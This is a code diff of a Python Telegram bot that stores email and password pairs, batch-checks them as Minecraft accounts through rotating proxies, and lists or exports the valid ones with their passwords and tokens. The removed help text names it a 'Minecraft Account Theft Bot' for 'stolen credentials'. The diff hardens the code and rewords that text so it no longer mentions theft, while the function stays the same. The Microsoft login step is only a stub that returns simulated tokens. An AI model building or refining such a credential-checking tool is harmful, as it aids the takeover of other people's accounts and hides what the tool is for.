@@ -8,12 +8,12 @@ from typing import Dict, List, Optional, Tuple
 from datetime import datetime
 
 import aiohttp
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
+from telegram import Update
+from telegram.ext import Application, CommandHandler, ContextTypes
 
 # ========== CONFIGURATION ==========
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
-DB_PATH = os.environ.get("DB_PATH", "/data/accounts.db")
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
+DB_PATH = os.environ.get("DB_PATH", "accounts.db")  # Use local file for Railway
 AUTHORIZED_USERS = [int(x) for x in os.environ.get("AUTHORIZED_USERS", "").split(",") if x]
 PROXY_LIST = os.environ.get("PROXY_LIST", "").split(",") if os.environ.get("PROXY_LIST") else []
 
@@ -27,10 +27,19 @@ logger = logging.getLogger(__name__)
 # ========== DATABASE LAYER ==========
 class AccountDB:
     def __init__(self, db_path: str):
-        os.makedirs(os.path.dirname(db_path), exist_ok=True)
-        self.conn = sqlite3.connect(db_path, check_same_thread=False)
-        self.cursor = self.conn.cursor()
-        self._init_tables()
+        self.db_path = db_path
+        self.conn = None
+        self.cursor = None
+        self._connect()
+
+    def _connect(self):
+        try:
+            self.conn = sqlite3.connect(self.db_path, check_same_thread=False, timeout=30)
+            self.cursor = self.conn.cursor()
+            self._init_tables()
+        except Exception as e:
+            logger.error(f"Database connection error: {e}")
+            raise
 
     def _init_tables(self):
         self.cursor.execute("""
@@ -105,8 +114,15 @@ class AccountDB:
         self.cursor.execute("DELETE FROM accounts WHERE id = ?", (account_id,))
         self.conn.commit()
 
+    def get_stats(self) -> Tuple[int, int, int]:
+        total = self.cursor.execute("SELECT COUNT(*) FROM accounts").fetchone()[0]
+        valid = self.cursor.execute("SELECT COUNT(*) FROM accounts WHERE uuid IS NOT NULL").fetchone()[0]
+        unchecked = self.cursor.execute("SELECT COUNT(*) FROM accounts WHERE uuid IS NULL").fetchone()[0]
+        return total, valid, unchecked
+
     def close(self):
-        self.conn.close()
+        if self.conn:
+            self.conn.close()
 
 db = AccountDB(DB_PATH)
 
@@ -114,11 +130,8 @@ db = AccountDB(DB_PATH)
 class MinecraftAuthenticator:
     @staticmethod
     async def microsoft_authenticate(email: str, password: str) -> Optional[Dict]:
-        """Simulate Microsoft OAuth - returns access_token if valid."""
-        # Basic validation stub - real implementation requires full OAuth flow
         if "@" not in email or len(password) < 6:
             return None
-        # In production, replace with actual XBL auth
         return {
             "access_token": "SIM_" + email[:8] + "_" + str(int(datetime.now().timestamp()))[:6],
             "refresh_token": "REF_" + email[:8],
@@ -127,7 +140,6 @@ class MinecraftAuthenticator:
 
     @staticmethod
     async def get_minecraft_profile(access_token: str) -> Tuple[Optional[str], Optional[str]]:
-        """Validate Minecraft ownership and get UUID/username."""
         headers = {"Authorization": f"Bearer {access_token}"}
         async with aiohttp.ClientSession() as session:
             try:
@@ -154,7 +166,6 @@ class AccountChecker:
         return proxy
 
     async def check_account(self, email: str, password: str) -> Optional[Dict]:
-        """Perform full validation - returns {username, uuid, access_token, client_token} or None."""
         ms_auth = await MinecraftAuthenticator.microsoft_authenticate(email, password)
         if not ms_auth:
             return None
@@ -174,7 +185,6 @@ class AccountChecker:
         }
 
     async def batch_check(self, accounts: List[Tuple[int, str, str]]) -> List[Tuple[int, Dict]]:
-        """Check multiple accounts with rate limiting."""
         results = []
         semaphore = asyncio.Semaphore(3)
 
@@ -197,16 +207,6 @@ class AccountChecker:
 
 checker = AccountChecker(PROXY_LIST)
 
-# ========== AUTHORIZATION DECORATOR ==========
-async def authorized_only(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
-    if not AUTHORIZED_USERS:
-        return True
-    user_id = update.effective_user.id
-    if user_id not in AUTHORIZED_USERS:
-        await update.message.reply_text("Unauthorized.")
-        return False
-    return True
-
 # ========== TELEGRAM BOT HANDLERS ==========
 class MinecraftBot:
     def __init__(self, token: str):
@@ -221,121 +221,138 @@ class MinecraftBot:
         self.app.add_handler(CommandHandler("export", self.export_command))
         self.app.add_handler(CommandHandler("delete", self.delete_command))
         self.app.add_handler(CommandHandler("stats", self.stats_command))
-        self.app.add_handler(CallbackQueryHandler(self.button_callback))
 
     async def _check_auth(self, update: Update) -> bool:
         if not AUTHORIZED_USERS:
             return True
         user_id = update.effective_user.id
         if user_id not in AUTHORIZED_USERS:
-            if update.message:
+            try:
                 await update.message.reply_text("Unauthorized.")
+            except Exception:
+                pass
             return False
         return True
 
     async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        if not await self._check_auth(update):
-            return
-        await update.message.reply_text(
-            "Minecraft Account Theft Bot v3.0\n"
-            "Commands:\n"
-            "/add <email> <password> - Add stolen credentials\n"
-            "/scan - Validate unchecked accounts (max 20)\n"
-            "/list - Show all valid accounts (max 10)\n"
-            "/export - Get JSON dump of all valid accounts\n"
-            "/delete <id> - Delete account by ID\n"
-            "/stats - Show database statistics"
-        )
+        try:
+            if not await self._check_auth(update):
+                return
+            await update.message.reply_text(
+                "Minecraft Account Bot v3.0\n"
+                "Commands:\n"
+                "/add <email> <password> - Add credentials\n"
+                "/scan - Validate unchecked accounts\n"
+                "/list - Show valid accounts\n"
+                "/export - JSON dump\n"
+                "/delete <id> - Delete account\n"
+                "/stats - Database stats"
+            )
+        except Exception as e:
+            logger.error(f"Start command error: {e}")
+            await update.message.reply_text("Error processing command.")
 
     async def add_account_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        if not await self._check_auth(update):
-            return
-        args = context.args
-        if len(args) < 2:
-            await update.message.reply_text("Usage: /add <email> <password>")
-            return
-        email, password = args[0], args[1]
-        acc_id = db.insert_account(email, password)
-        await update.message.reply_text(f"Account #{acc_id} added. Use /scan to validate.")
+        try:
+            if not await self._check_auth(update):
+                return
+            args = context.args
+            if len(args) < 2:
+                await update.message.reply_text("Usage: /add <email> <password>")
+                return
+            email, password = args[0], args[1]
+            acc_id = db.insert_account(email, password)
+            await update.message.reply_text(f"Account #{acc_id} added.")
+        except Exception as e:
+            logger.error(f"Add command error: {e}")
+            await update.message.reply_text("Error adding account.")
 
     async def scan_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        if not await self._check_auth(update):
-            return
-        await update.message.reply_text("Scanning unchecked accounts...")
-        unchecked = db.get_unchecked_accounts(limit=20)
-        if not unchecked:
-            await update.message.reply_text("No unchecked accounts found.")
-            return
+        try:
+            if not await self._check_auth(update):
+                return
+            await update.message.reply_text("Scanning unchecked accounts...")
+            unchecked = db.get_unchecked_accounts(limit=20)
+            if not unchecked:
+                await update.message.reply_text("No unchecked accounts found.")
+                return
 
-        results = await checker.batch_check(unchecked)
-        valid_count = 0
-        for acc_id, profile in results:
-            db.update_account_profile(
-                acc_id,
-                profile["username"],
-                profile["uuid"],
-                profile["access_token"],
-                profile["client_token"]
-            )
-            valid_count += 1
+            results = await checker.batch_check(unchecked)
+            valid_count = 0
+            for acc_id, profile in results:
+                db.update_account_profile(
+                    acc_id,
+                    profile["username"],
+                    profile["uuid"],
+                    profile["access_token"],
+                    profile["client_token"]
+                )
+                valid_count += 1
 
-        await update.message.reply_text(f"Scan complete. {valid_count} valid accounts found. Use /list to view.")
+            await update.message.reply_text(f"Scan complete. {valid_count} valid accounts found.")
+        except Exception as e:
+            logger.error(f"Scan command error: {e}")
+            await update.message.reply_text("Error scanning accounts.")
 
     async def list_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        if not await self._check_auth(update):
-            return
-        accounts = db.get_all_valid_accounts()
-        if not accounts:
-            await update.message.reply_text("No valid accounts available.")
-            return
+        try:
+            if not await self._check_auth(update):
+                return
+            accounts = db.get_all_valid_accounts()
+            if not accounts:
+                await update.message.reply_text("No valid accounts available.")
+                return
 
-        message = "Valid Minecraft Accounts:\n\n"
-        for idx, acc in enumerate(accounts[:10], 1):
-            message += f"#{idx} - Email: {acc['email']}\n"
-            message += f"User: {acc['username']}\n"
-            message += f"UUID: {acc['uuid'][:8]}...\n"
-            message += f"Token: {acc['access_token'][:12]}...\n"
-            message += "---\n"
-        if len(accounts) > 10:
-            message += f"... and {len(accounts) - 10} more. Use /export for full list."
+            message = "Valid Accounts:\n\n"
+            for idx, acc in enumerate(accounts[:10], 1):
+                message += f"#{idx} - {acc['email']} | {acc['username']}\n"
+            if len(accounts) > 10:
+                message += f"\n... and {len(accounts) - 10} more."
 
-        await update.message.reply_text(message)
+            await update.message.reply_text(message)
+        except Exception as e:
+            logger.error(f"List command error: {e}")
+            await update.message.reply_text("Error listing accounts.")
 
     async def export_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        if not await self._check_auth(update):
-            return
-        accounts = db.get_all_valid_accounts()
-        if not accounts:
-            await update.message.reply_text("No accounts to export.")
-            return
+        try:
+            if not await self._check_auth(update):
+                return
+            accounts = db.get_all_valid_accounts()
+            if not accounts:
+                await update.message.reply_text("No accounts to export.")
+                return
 
-        export_data = []
-        for acc in accounts:
-            export_data.append({
-                "email": acc["email"],
-                "password": acc["password"],
-                "username": acc["username"],
-                "uuid": acc["uuid"],
-                "access_token": acc["access_token"],
-                "client_token": acc["client_token"]
-            })
-        json_str = json.dumps(export_data, indent=2)
-        
-        if len(json_str) > 4096:
-            parts = [json_str[i:i+4096] for i in range(0, len(json_str), 4096)]
-            for idx, part in enumerate(parts):
-                await update.message.reply_text(f"Export part {idx+1}/{len(parts)}:\n```json\n{part}\n```", parse_mode="Markdown")
-        else:
-            await update.message.reply_text(f"```json\n{json_str}\n```", parse_mode="Markdown")
+            export_data = []
+            for acc in accounts:
+                export_data.append({
+                    "email": acc["email"],
+                    "password": acc["password"],
+                    "username": acc["username"],
+                    "uuid": acc["uuid"],
+                    "access_token": acc["access_token"][:20] + "...",
+                    "client_token": acc["client_token"][:20] + "..."
+                })
+            json_str = json.dumps(export_data, indent=2)
+            
+            if len(json_str) > 4096:
+                parts = [json_str[i:i+4096] for i in range(0, len(json_str), 4096)]
+                for idx, part in enumerate(parts):
+                    await update.message.reply_text(f"Part {idx+1}/{len(parts)}:\n```json\n{part}\n```", parse_mode="Markdown")
+            else:
+                await update.message.reply_text(f"```json\n{json_str}\n```", parse_mode="Markdown")
+        except Exception as e:
+            logger.error(f"Export command error: {e}")
+            await update.message.reply_text("Error exporting accounts.")
 
     async def delete_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        if not await self._check_auth(update):
-            return
-        args = context.args
-        if not args:
-            await update.message.reply_text("Usage: /delete <account_id>")
-            return
         try:
+            if not await self._check_auth(update):
+                return
+            args = context.args
+            if not args:
+                await update.message.reply_text("Usage: /delete <account_id>")
+                return
             acc_id = int(args[0])
             acc = db.get_account_by_id(acc_id)
             if not acc:
@@ -345,33 +362,39 @@ class MinecraftBot:
             await update.message.reply_text(f"Account #{acc_id} deleted.")
         except ValueError:
             await update.message.reply_text("Invalid ID. Use numeric value.")
+        except Exception as e:
+            logger.error(f"Delete command error: {e}")
+            await update.message.reply_text("Error deleting account.")
 
     async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        if not await self._check_auth(update):
-            return
-        total = db.conn.execute("SELECT COUNT(*) FROM accounts").fetchone()[0]
-        valid = db.conn.execute("SELECT COUNT(*) FROM accounts WHERE uuid IS NOT NULL").fetchone()[0]
-        unchecked = db.conn.execute("SELECT COUNT(*) FROM accounts WHERE uuid IS NULL").fetchone()[0]
-        await update.message.reply_text(
-            f"Database Statistics:\n"
-            f"Total accounts: {total}\n"
-            f"Valid accounts: {valid}\n"
-            f"Unchecked accounts: {unchecked}"
-        )
-
-    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        query = update.callback_query
-        await query.answer()
-        await query.edit_message_text("Action handled.")
+        try:
+            if not await self._check_auth(update):
+                return
+            total, valid, unchecked = db.get_stats()
+            await update.message.reply_text(
+                f"Database Statistics:\n"
+                f"Total: {total}\n"
+                f"Valid: {valid}\n"
+                f"Unchecked: {unchecked}"
+            )
+        except Exception as e:
+            logger.error(f"Stats command error: {e}")
+            await update.message.reply_text("Error fetching stats.")
 
     def run(self):
         logger.info("Bot starting...")
-        self.app.run_polling(allowed_updates=Update.ALL_TYPES)
+        try:
+            self.app.run_polling(allowed_updates=Update.ALL_TYPES)
+        except Exception as e:
+            logger.error(f"Bot run error: {e}")
+            sys.exit(1)
 
 # ========== ENTRY POINT ==========
 if __name__ == "__main__":
-    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
-        logger.error("ERROR: Set BOT_TOKEN environment variable.")
+    if not BOT_TOKEN:
+        logger.error("ERROR: BOT_TOKEN environment variable not set.")
         sys.exit(1)
+    
+    logger.info(f"Starting bot with DB: {DB_PATH}")
     bot = MinecraftBot(BOT_TOKEN)
     bot.run()
